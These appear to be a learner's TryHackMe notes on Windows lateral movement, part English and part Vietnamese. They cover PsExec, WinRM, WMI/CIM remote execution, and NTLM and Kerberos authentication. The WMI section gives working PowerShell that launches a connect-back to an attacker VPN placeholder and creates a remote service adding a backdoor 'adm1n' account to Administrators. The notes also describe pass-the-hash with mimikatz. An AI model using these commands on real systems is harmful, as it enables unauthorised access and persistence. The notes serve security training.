---
title: "Lateral Movement and Pivoting"
date: 2025-08-07 10:38:00 +0700
categories: ["TryHackMe", "SOC LV1", "Lateral Movement and Pivoting"]
tags: ["tryhackme", "lateral-movement-and-pivoting"]
description: "What is Local administrator accounts ?"
media_subpath: /assets/img/tryhackme/2025-08-07-lateral-movement-and-pivoting/
toc: true
comments: false
hidden: true
permalink: /tryhackme/soc-lv1/lateral-movement-and-pivoting/
th_id: "soc-lv1/lateral-movement-and-pivoting"
th_parent: "soc-lv1"
th_kind: module
th_order: 24
th_course: "soc-lv1"
th_module: "soc-lv1/lateral-movement-and-pivoting"
th_size: 0
th_ancestors: ["soc-lv1"]
---

{% include tryhackme-nav.html %}

### I. Moving through the Network Administrators and UAC

What is Local administrator accounts ? 

- A **local administrator account** exists only in the local Security Accounts Manager (SAM) database of a Windows computer ( these accounts are not stored in AD)

```bash
PC01
 ├── Administrator
 ├── Bob
 └── Alice
```

- Can a local administrator connect remotely?

| RDP | Y |
| --- | --- |
| SMB | N |
| WinRM | N |
| WMI/RPC | N |

**Domain accounts with local admin** can open an administrative login using RDP, WinRM, SMB, or RPC. However, this behavior can be disabled.

### II. Remote Sessions

[TryHackMe | Lateral Movement & Pivoting](https://benheater.com/tryhackme-lateral-movement-pivoting/)

- PsExec (SMB protocol)

![image.png](image.png)

- WinRM
- Ad-Hoc Commands
- sc.exe (SCM)
    - through RPC
    - SMB
- schtasks

![image.png](image%201.png)

![image.png](image%202.png)

![image.png](image%203.png)

### III. WMI

Hiện tại CIM cmdlets trên các dòng mới nhưng WIM cmdlets vẫn còn chứ không bị khai tử ( WMI cmdlets là bản ra đời để thay thế wmic.exe)

CIM Cmdlets > WMI Cmdlets > WIMC.exe

**1. Connecting to WMI from PowerShell**

1. Requirements
- **Target Ports**
    - **RPC** - `TCP/135` + `TCP/49152-65535`
    - Or
        - **WinRM** over HTTP - `TCP/5985` or...
        - **WinRM** over HTTPS - `TCP/5986`
- **Required Group Memberships on Target**
    - Administrators

b. Create a Credential object to for authentication

```bash
$username = 'user.name'
$password = 'password' | ConvertTo-SecureString -AsPlainText -Force
$credential = [pscredential]::new($username, $password)
```

c. Create a CIM Session for Repeated Use ( tránh tình trạng tạo kết nối mỗi lệnh)

- **DCOM:** Connect to the target via RPC on `TCP/135` , RPC will direct the client to high numbered port `TCP/49152-65535`
- **WSman:** WinRM – connect via HTTP (`TCP/5985`) or HTTPS (`TCP/5986`)

```bash
$server = 'target-ip / fqdn'
$sessionopt = New-CimSessionOption -Protocol DCOM
$session = New-CimSession -ComputerName $server -Credential $credential -SessionOption $sessionopt -ErrorAction Stop
```

d. Run a Command Remotely

```bash
$kaliVpnIP = 'kali-vpn-ip'
$kaliPort = 443

## Try to connect back to Kali on a TCP port of choice
$command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command `"[Net.Sockets.TcpClient]::new().ConnectAsync('$kaliVpnIP', $kaliPort)`""

## Parameter splatting
$parameters = @{
    CimSession = $session
    ClassName = 'Win32_Process'
    MethodName = 'Create'
    Arguments = @{
    	CommandLine = $command
    }
}
Invoke-CimMethod @parameters
```

#### 2. Creating Services Remotely

1. Create the Service

```bash
$parameters = @{
    CimSession = $session
    ClassName = 'Win32_Service'
    MethodName = 'Create'
    Arguments = @{
        Name = 'l337service'
        DisplayName = 'l337service'
        PathName = 'net user adm1n password123 /ADD'
        ServiceType = [byte]16
        StartMode = 'Manual'
    }
}
Invoke-CimMethod @parameters
```

b. Discover the Service and Start it

```bash
$svc = Get-CimInstance -CimSession $session -ClassName Win32_Service -Filter "Name LIKE 'l337service'"
$svc | Invoke-CimMethod -MethodName StartService
```

c. Modify the Service and Re-Run It

```bash
$svc | Invoke-CimMethod -MethodName Change -Arguments @{PathName = 'net localgroup Administrators adm1n /ADD'}
$svc | Invoke-CimMethod -MethodName StartService
```

The same way with Task,…

for WMI

![image.png](image%204.png)

![image.png](image%205.png)

### IV. WinRM ( Powershell Remote )

![image.png](image%206.png)

![image.png](image%207.png)

### IV. **Use of Alternate Authentication Material**

In other words, you've managed to harvest a user NTLM hash or a Kerberos ticket. Rather than knowing the password, you may be able to leverage this item as a means to authenticate as the user.

##### 1. NTLM Authentication

1. Logon with Domain Account

```bash
 CLIENT                        SERVER               DOMAIN CONTROLLER   
    |                             |                        |
| --- | --- |
    | 1. ----[auth request]---->  |                        |
    |                             |                        |
    | 2. <---[NTLM challenge]---  |                        |
    |                             |                        |
    |            Response         |                        |
    |        ________________     |                        |
    |       |    NTLM Hash   |    |                        |
    | 3.  --|        +       |--> |        ___________     |
    |       | NTLM Challenge |    |       | Challenge |    |
    |        ----------------     | 4.  --|     +     |--> |
    |                             |       | Response  |    |
    |                             |        -----------     |
    |                             |                        |
    |                             | DC checks its own copy |
    |                             | of user NTLM hash and  |
    |                             | compares the vaule of  |
    |                             | hash + challenge to    |
    |                             | see if they match and  |
    |                             | approve or deny.       |
    |                             |                        |
    | 6. <----[Allow/Deny]----    | 5. <---[Allow/Deny]--- |
```

b. Logon with Local account

![image.png](image%208.png)

**Pass-the-hash**

If an attacker manages to compromise a machine where domain user is logged in, the attacker may be able to dump the domain user's NTLM hash from memory by using a tool like `mimikatz` or other methods.

https://notes.benheater.com/books/active-directory/page/mimikatz?ref=benheater.com

##### 2. **Kerberos Authentication**

**Ticket Granting Ticket**

```bash
 CLIENT                                         KDC on DOMAIN CONTROLER
    |                                                        |
| --- |
    | Client sends a timestamp                               |
    | encrypted with a key                                   |
    | derived from the user hash                             |
    |             __________                                 |
    |            | Username |                                |
    | 1. --------|     +    |-------->                       |
    |            | Crypt TS |                                |
    |             ----------                                 |
    |                                                        |
    |                             KDC sends back an          |
    |                             encrypted TGT and a        |
    |                             session key. The TGT       |
    |                             is signed with the krbtgt  |
    |                             key to prevent tampering.  |
    |                             As long as the session has |
    |                             not lapsed, the user can   |
    |                             reuse the TGT as often as  |
    |                             needed to request a TGS.   |
    |                                 _____________          |
    |                                |     TGT     |         |
    |                     2. <-------|      +      |-------- |
    |                                | SESSION KEY |         |
    |                                 -------------          |
```

**Ticket Granting Service**

```bash
 CLIENT                                         KDC on DOMAIN CONTROLER
    |                                                        |
| --- |
    | When the client wants to connect to                    |
    | a service, the client willl encrypt                    |
    | a timestamp using the session key                      |
    | and send its TGT and the Service                       |
    | Principal Name to be requested.                        |
    |             __________                                 |
    |            | Username |                                |
    |            |     +    |                                |
    |            | Crypt TS |                                |
    | 3. --------|     +    |--------->                      |
    |            |    TGT   |                                |
    |            |     +    |                                |
    |            |    SPN   |                                |
    |             ----------                                 |
    |                                                        |
    |                             The KDC will send a TGS    |
    |                             encrypted with the Service |
    |                             Principal's (SP)hash. The  |
    |                             SP is the user or machine  |
    |                             account under which the    |
    |                             service runs. The TGS also |
    |                             has a service session key, |
    |                             so when the SP decrypts    |
    |                             the ticket, the SP will    |
    |                             have a session key for the |
    |                             user.                      |
    |                                 _____________          |
    |                                |     TGS     |         |
    |                                |      +      |         |
    |                    4. <--------|   Service   |-------- |
    |                                |   Session   |         |
    |                                |     Key     |         |
    |                                 -------------          |
```

**User Authentication**

```bash
 CLIENT                                              SERVICE PRINCIPAL
    |                                                        |
| --- |
    | The client then sends the TGS and                      |
    | service session key to the SP.                         |
    | Since the service seesion key is                       |
    | encrypted using the SPs hash, the                      |
    | SP can decrypt and inspect the ticket.                 |
    |             __________                                 |
    |            | Username |                                |
    |            |     +    |                                |
    | 3. --------| Crypt TS |--------->                      |
    |            |     +    |                                |
    |            |    TGS   |                                |
    |             ----------                                 |
    |                                                        |
```

## V. Credential on target

![image.png](image%209.png)
